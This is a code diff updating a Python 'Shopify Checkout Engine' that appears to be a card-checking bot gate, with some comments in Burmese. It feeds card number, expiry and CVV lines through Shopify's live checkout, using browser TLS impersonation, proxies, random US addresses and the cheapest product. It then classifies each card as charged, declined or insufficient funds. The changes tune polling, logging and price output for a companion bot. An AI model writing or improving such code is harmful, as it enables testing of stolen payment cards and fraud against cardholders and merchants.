@@ -1,21 +1,15 @@
 """
-Shopify Checkout Engine — V11
+Shopify Checkout Engine — V12
 ==============================
 Async + curl_cffi (chrome124) + full GraphQL query.
-Fixed: UNKNOWN response, price display, timeout.
+Bot.py compatible — Response/Price/Gate format မှန်ကန်.
 
-Key Features:
-- AsyncSession (curl_cffi) — TLS fingerprint chrome124
-- Full GraphQL query (not persisted ID)
-- /checkouts/unstable/graphql (no SUBMIT_FAILED)
-- /cart/add.js + /cart POST
-- 3 PCI endpoints fallback
-- SOFT_ERRORS retry
-- Cheapest product selection
-- Random US address per attempt
-- Shipping method names mapped to CARD_DECLINED
-- Product price returned in every response
-- UNKNOWN mapped to CARD_DECLINED
+Key Fixes:
+- Poll log for debugging
+- amount clean (no " USD")
+- _poll_receipt() sleep 1.5s (5 attempts = 7.5s)
+- UNKNOWN → CARD_DECLINED
+- Shipping method names mapped
 """
 
 import asyncio
@@ -136,8 +130,8 @@ _SHOPIFY_ERROR_MAP: Dict[str, str] = {
     "insufficient_funds": "INSUFFICIENT_FUNDS",
     "card declined": "CARD_DECLINED",
     "card_declined": "CARD_DECLINED",
-    "invalid card": "CARD_INVALID",
-    "invalid_card": "CARD_INVALID",
+    "invalid card": "INVALID_CARD",
+    "invalid_card": "INVALID_CARD",
     "expired card": "EXPIRED_CARD",
     "card expired": "EXPIRED_CARD",
     "incorrect cvc": "INVALID_CVC",
@@ -613,12 +607,10 @@ class ShopifyEngine:
                     return {"status": "failed", "reason": f"http_{r.status_code}"}
 
                 result = r.json()
-                # ⭐ Log full response for debugging
                 logger.info("submit response: %s", json.dumps(result)[:500])
 
                 completion = result.get("data", {}).get("submitForCompletion", {})
 
-                # Extract checkoutTotal if present
                 try:
                     total_match = re.search(
                         r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
@@ -664,7 +656,7 @@ class ShopifyEngine:
 
     async def _poll_receipt(self, rid: str, headers: Dict) -> Dict:
         for i in range(5):
-            await asyncio.sleep(2)
+            await asyncio.sleep(1.5)
             try:
                 session = await self._get_session()
                 r = await session.post(
@@ -678,9 +670,12 @@ class ShopifyEngine:
                     timeout=REQUEST_TIMEOUT,
                 )
                 if r.status_code != 200:
+                    logger.warning("poll #%d HTTP %d", i, r.status_code)
                     continue
 
                 data = r.json()
+                logger.info("poll #%d: %s", i, json.dumps(data)[:400])
+
                 receipt = data.get("data", {}).get("receipt", {})
                 tn = receipt.get("__typename")
 
@@ -696,8 +691,10 @@ class ShopifyEngine:
                     code = pe.get("code", "CARD_DECLINED")
                     msg = pe.get("messageUntranslated", "")
                     mapped = _map_error(code) or _map_error(msg) or "CARD_DECLINED"
+                    logger.info("poll #%d FailedReceipt code=%s msg=%s", i, code, msg)
                     return {"status": "declined", "code": mapped, "message": msg}
-            except Exception:
+            except Exception as e:
+                logger.warning("poll #%d exception: %s", i, e)
                 continue
         return {"status": "timeout"}
 
@@ -711,10 +708,8 @@ class ShopifyEngine:
                 return {"status": "failed", "step": 2, "reason": "CART_FAILED"}
             if not await self.init_checkout():
                 return {"status": "failed", "step": 3, "reason": "NO_SESSION_TOKEN"}
-            await asyncio.sleep(0.3)
             if not await self.create_payment_session(cc, mon, year, cvv):
                 return {"status": "failed", "step": 4, "reason": "TOKENIZATION_FAILED"}
-            await asyncio.sleep(0.3)
             return await self.submit_payment()
         except Exception as e:
             logger.warning("checkout exception: %s", e)
@@ -731,7 +726,7 @@ class ShopifyEngine:
         self.payment_session_id = None
 
 
-# ──────────────────────── Public API (sync wrapper) ──────────────────
+# ──────────────────────── Public API ─────────────────────────────────
 
 def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
     card_parts = card_entry.strip().split('|')
@@ -740,6 +735,8 @@ def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
     try:
         card_month = int(card_parts[1])
         card_year = int(card_parts[2])
+        if card_year < 100:
+            card_year += 2000
     except ValueError as e:
         raise Exception(f"CARD_INVALID: {e}")
     return card_parts[0], card_month, card_year, card_parts[3]
@@ -789,7 +786,11 @@ async def _run_checkout_async(shop_url: str, card_entry: str, proxy_url: str = "
         await engine.close()
 
     status = r.get("status", "unknown")
+
+    # ⭐ Price ကို " USD" မပါအောင် clean
     price_value = engine.checkout_total or engine.product_price or ""
+    if price_value:
+        price_value = str(price_value).replace(" USD", "").replace("$", "").strip()
 
     if status == "charged":
         result.status = CheckStatus.CHARGED
@@ -856,7 +857,6 @@ async def _run_checkout_async(shop_url: str, card_entry: str, proxy_url: str = "
         result.error = Exception("CARD_DECLINED")
 
     else:
-        # ⭐ UNKNOWN → CARD_DECLINED
         result.status = CheckStatus.DECLINED
         result.status_code = "CARD_DECLINED"
         result.amount = price_value
@@ -866,9 +866,6 @@ async def _run_checkout_async(shop_url: str, card_entry: str, proxy_url: str = "
 
 
 def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", low: bool = True) -> CheckResult:
-    """
-    Sync wrapper — thread-safe.
-    """
     import concurrent.futures
 
     def _run():
